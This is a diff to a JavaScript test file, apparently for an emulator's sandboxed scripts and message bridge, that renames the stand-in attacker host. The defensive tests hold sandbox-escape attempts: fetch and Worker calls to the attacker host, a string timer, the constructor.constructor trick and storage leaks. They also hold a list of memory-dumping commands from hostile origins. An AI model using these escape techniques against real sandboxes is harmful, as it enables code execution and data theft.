@@ -415,7 +415,7 @@ test("opaque and cross-origin contexts cannot use the message bridge to dump arb
         const hostileCommands = [
             "dumpMemory", "memoryReadByte", "memoryReadWord", "memoryReadDword", "getRegisters"
         ];
-        for (const origin of ["null", "https://attacker.example"]) {
+        for (const origin of ["null", "https://attacker.invalid"]) {
             for (const command of hostileCommands) {
                 const replies = [];
                 await messageHandler({
@@ -1467,14 +1467,14 @@ test("persistent-script legacy memory reads remain numeric", async () => {
 
 test("persistent sandbox blocks network, message forgery, storage, and code-generation escape", async () => {
     const { messages, networkCalls, storageCalls } = await runPersistentScalarSandbox(`
-        try { await fetch("https://attacker.example/network"); } catch {}
-        try { globalThis.fetch("https://attacker.example/global"); } catch {}
-        try { new Worker("https://attacker.example/worker.js"); } catch {}
+        try { await fetch("https://attacker.invalid/network"); } catch {}
+        try { globalThis.fetch("https://attacker.invalid/global"); } catch {}
+        try { new Worker("https://attacker.invalid/worker.js"); } catch {}
         try { postMessage({ type: "forged" }); } catch {}
         try { localStorage.setItem("rom", "leak"); } catch {}
         try { sessionStorage.getItem("rom"); } catch {}
-        try { setTimeout('fetch("https://attacker.example/timer")', 0); } catch {}
-        try { ({}).constructor.constructor('fetch("https://attacker.example/constructor")')(); } catch {}
+        try { setTimeout('fetch("https://attacker.invalid/timer")', 0); } catch {}
+        try { ({}).constructor.constructor('fetch("https://attacker.invalid/constructor")')(); } catch {}
         print(typeof fetch, typeof Worker, typeof postMessage, typeof localStorage, typeof sessionStorage);
     `, []);
     assert.equal(networkCalls, 0);
